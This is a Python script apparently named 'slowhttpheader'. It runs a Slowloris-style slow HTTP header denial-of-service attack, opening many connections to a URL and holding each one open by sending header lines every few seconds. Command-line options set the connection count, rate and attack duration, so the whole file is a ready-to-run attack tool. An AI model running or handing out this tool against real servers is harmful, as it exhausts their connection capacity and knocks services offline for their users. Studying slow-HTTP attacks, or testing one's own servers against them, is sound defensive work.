#!/usr/bin/env python3
import argparse
import asyncio
from asyncio import wait_for
import logging
import random
import time
from urllib.parse import urlparse

log = logging.getLogger('slowhttpheader')
formatter = logging.Formatter(
    ('%(asctime)s.%(msecs)03d: %(levelname).1s/%(name)s: '
     '%(filename)s:%(lineno)d: %(message)s'),
    datefmt='%H:%M:%S',
)
console = logging.StreamHandler()
console.setFormatter(formatter)
log.addHandler(console)
log.setLevel(logging.INFO)


async def set_timeout(coro, timeout):
    await asyncio.sleep(timeout)
    await coro


async def conn(hostname, port, path, conn_time, conn_interval):
    try:
        start_ts = time.time()
        stop_ts = start_ts + conn_time
        random_id = random.randrange(1000)
        log.info('[%03d] open conn', random_id)
        reader, writer = await wait_for(
            asyncio.open_connection(hostname, 80), timeout=5)
        header_s = ('GET {path} HTTP/1.1\r\n'
                    'Host: {hostname}\r\n').format(
                        path=path, hostname=hostname)

        writer.write(header_s.encode())
        await wait_for(writer.drain(), 5)
        while time.time() + conn_interval < stop_ts:
            await asyncio.sleep(conn_interval)
            line = 'X-A: a\r\n'
            writer.write(line.encode())
        remain_t = stop_ts - time.time()
        if remain_t > 0:
            await asyncio.sleep(remain_t)
        writer.write(b'\r\n')

        content_length = 0
        while True:
            line = await wait_for(reader.readline(), 5)
            if line.startswith(b'Content-Length: '):
                content_length = int(line[16:-2])
            if line == b'\r\n':
                break
        if content_length > 0:
            remain_size = content_length
            while remain_size > 0:
                data = await wait_for(reader.read(remain_size), 5)
                remain_size -= len(data)
        log.info('[%03d] close conn', random_id)
        writer.close()
    except asyncio.TimeoutError:
        log.info('[%03d] asyncio.TimeoutError', random_id)
    except Exception as e:
        log.info(e)


async def delay_conn(delay, hostname, port, path, conn_time, conn_interval):
    if conn_time - delay > 0:
        await asyncio.sleep(delay)
        await conn(hostname, port, path, conn_time - delay, conn_interval)


async def attack(url, num_conn, rate, attack_time, conn_time, **kwargs):
    u = urlparse(url)
    hostname = u.hostname
    port = 80 if u.port is None else u.port
    path = u.path if len(u.path) > 0 else '/'
    loop = asyncio.get_event_loop()
    n = int(attack_time // (conn_time + 1) + 1)
    tasks = []
    start_ts = time.time()
    stop_ts = start_ts + attack_time
    for i in range(n):
        for j in range(num_conn):
            _conn_time = min(conn_time, stop_ts - time.time())
            if conn_time > 0:
                tasks.append(
                    loop.create_task(
                        delay_conn(
                            delay=j/rate,
                            hostname=hostname,
                            port=port,
                            path=path,
                            conn_time=_conn_time,
                            **kwargs,
                        )
                    )
                )
        if i < n - 1:
            await asyncio.sleep(conn_time + .5)
    try:
        await wait_for(asyncio.gather(*tasks), attack_time + 3)
    except asyncio.TimeoutError:
        log.info('asyncio.TimeoutError')


def custom_exception_handler(loop, context):
    # https://stackoverflow.com/questions/43207927/
    # first, handle with default handler
    loop.default_exception_handler(context)


def main():
    pser = argparse.ArgumentParser()
    pser.add_argument('-u', '--url', required=True)
    pser.add_argument('-c', '--num-conn', type=int, default=1)
    pser.add_argument('-r', '--rate', type=float, default=1.0)
    pser.add_argument('-l', '--conn-time', type=float, default=30.0)
    pser.add_argument('-i', '--conn-interval', type=float, default=10.0)
    pser.add_argument('-a', '--attack-time', type=float, default=60.0)
    args = pser.parse_args()
    # asyncio.run(attack(**vars(args)))
    loop = asyncio.get_event_loop()
    loop.set_exception_handler(custom_exception_handler)
    loop.run_until_complete(attack(**vars(args)))


if __name__ == '__main__':
    main()
